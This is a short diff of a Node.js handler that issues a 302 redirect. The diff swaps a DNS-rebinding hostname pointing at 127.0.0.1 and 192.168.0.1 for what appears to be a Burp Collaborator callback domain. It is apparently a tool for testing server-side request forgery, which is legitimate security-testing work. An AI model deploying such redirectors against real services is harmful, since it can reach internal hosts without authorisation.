@@ -1,5 +1,5 @@
 module.exports = (req, res) => {
-  const target = 'https://7f000001.c0a80001.rbndr.us';
+  const target = 'https://7u2l9czh97jx2hzdp8yicdn2ctil6gu5.oastify.com';
 
   res.status(302);
   res.setHeader('Location', target);
